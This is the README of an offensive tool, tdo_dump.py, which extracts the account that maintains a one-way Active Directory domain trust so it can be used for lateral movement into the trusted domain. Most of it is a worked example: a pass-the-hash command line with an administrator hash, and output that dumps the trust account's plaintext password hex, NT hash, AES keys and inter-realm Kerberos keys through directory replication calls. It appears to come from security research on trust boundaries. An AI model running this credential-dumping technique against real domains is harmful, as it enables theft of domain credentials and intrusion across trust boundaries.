# tdo_dump.py

Domain and forest [trusts](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-1) [are](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d) [a](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/) [well-known](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/) [research](https://adsecurity.org/?p=1588) [topic](https://adsecurity.org/?p=1640). Rather than revisiting all of its aspects, the present article focuses on one-way trusts: the account used for maintaining the trust between domains can be extracted with a new tool, **tdo_dump.py**, from the trusting domain and used to authenticate on the trusted domain. Thus, trusted domain objects can be helpful in performing lateral movement across security boundaries within Windows environments.

More information in the [accompanying blog post](https://offsec.almond.consulting/trust-no-one_are-one-way-trusts-really-one-way.html).

Note: `tdo_dump.py` needs the trusted domain object GUID and the ntDSDSA GUID. Those two GUIDs can be retrieved using your favorite AD object explorer.

## Example

```console
$ python dump_tdo.py -u Administrator -d offsec.lol -t sevres.offsec.lol --hashes 47465558945703bbe17c0b7a12c0627c --tdo-guid d0547ff6-8f3f-462c-9f2d-11c427320691  --dsa-guid 79a82840-4173-4402-8202-77c27639f2f2 --debug
[+] Calling hept_map: ('E3514235-4B06-11D1-AB04-00C04FC2DCD2', '4.0')
[x] Binding string: ncacn_ip_tcp:10.0.0.1[49668]
[+] Calling DRSBind
[x] Context handle: 00000000990879b0fd0deb42b12527b95d5ade7f
[+] Calling DRSGetNCChanges for d0547ff6-8f3f-462c-9f2d-11c427320691 on 79a82840-4173-4402-8202-77c27639f2f2
[+] Distinguishe name retrieved: CN=admin.yeah,CN=System,DC=offsec,DC=lol
[!] Cannot get trustAuthIncoming for CN=admin.yeah,CN=System,DC=offsec,DC=lol, mostly because it is a one way trust
[+] Dumping trusted domain object: offsec.lol → admin.yeah
admin.yeah:plain_password_hex:53006f006c00650069006c003100320033002100
admin.yeah:aad3b435b51404eeaad3b435b51404ee:47465558945703bbe17c0b7a12c0627c:::
[+] Salt: ADMIN.YEAHkrbtgtOFFSEC
admin.yeah:aes256-cts-hmac-sha1-96:0f01b0c55e73138f5cebec57ad04a59e3ec559f78c5c39456e7f7b446d9ce960
admin.yeah:aes128-cts-hmac-sha1-96:7235212ba424996d120c9389cb0f158d
[+] Dumping inter-realm trust keys
[+] Salt: ADMIN.YEAHkrbtgtOFFSEC.LOL
admin.yeah-Outgoing:aes256-cts-hmac-sha1-96:5b7191449bfb9dfe157958fee011b555d742bb261425d399dd9a408198ed0fa9
admin.yeah-Outgoing:aes128-cts-hmac-sha1-96:2a442fafd283d04687f4be165eb3092b
```
